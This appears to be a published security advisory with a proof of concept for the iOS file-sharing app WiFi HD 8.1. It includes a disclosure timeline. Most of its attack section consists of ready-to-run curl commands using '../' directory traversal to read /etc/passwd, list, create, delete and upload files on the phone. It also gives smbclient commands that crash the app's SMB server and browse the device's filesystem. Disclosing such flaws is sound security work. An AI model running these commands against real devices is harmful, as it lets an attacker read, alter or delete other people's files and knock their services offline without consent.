@@ -1,0 +1,51 @@
+# Exploit Title: WiFi HD 8.1 - Directory Traversal and Denial of Service
+# Date: 2015-05-27
+# Exploit Author: Wh1t3Rh1n0 (Michael Allen)
+# Vendor Homepage: http://www.savysoda.com
+# Software Link: http://www.savysoda.com/WiFiHD/
+# Version: 8.1 (Apr 1, 2015)
+# Tested on: iPhone
+
+Disclosure Timeline:
+* 2015-05-30: Vendor notified via email.
+* 2015-06-05: No reponse from the vendor. Advisory released.
+
+
+Software description:
+=====================
+WiFi HD is an iOS app which allows users to share files between their iPhone and PC by running a web server, FTP server, or SMB server on the iPhone or through various cloud services. 
+
+
+Vulnerabilities:
+================
+The web server (titled "WiFi" in the app) is vulnerable to multiple directory traversal issues which allow an attacker to download, upload, create, or delete any file to which the app has access. The SMB server (titled "Shared Folder") is vulnerable to a Denial of Service attack when issued the command, "dir -c", within smbclient. It also discloses a listing of all readable files within the iPhone's file system via the IPC$ share.
+
+
+Web Server Proof-of-Concept
+===========================
+Read arbitrary files/folders:
+    Read /etc/passwd:
+        curl "http://[TARGET IP]/../../../../../../../../etc/passwd"
+    List contents of the /tmp directory:
+        curl "http://[TARGET IP]/../../../../../../../../tmp/"
+
+Create Folders:
+    Create the folder, "/tmp/PoC-Folder":
+        curl -d 'foldername=/../../../../../../../../tmp/PoC-Folder&button=Create+Folder' "http://[TARGET IP]/"
+    
+Delete Files/Folders:
+    Delete the folder, "/tmp/PoC-Folder":
+        curl 'http://[TARGET IP]/!DEL!/../../../../../../../../tmp/PoC-Folder'
+                                  
+Upload a File:
+    Upload /etc/services to /tmp/example.txt:
+        curl -F 'file=@/etc/services;filename=/../../../../../../../../tmp/example.txt' -F 'button=Submit' 'http://[TARGET IP]/'
+
+    
+SMB Server Proof-of-Concept
+===========================
+Denial of Service:
+    smbclient -N -c 'dir \' //[TARGET IP]/IPC$
+    
+Browse the iPhone's Filesystem:
+    smbclient -N //[TARGET IP]/IPC$
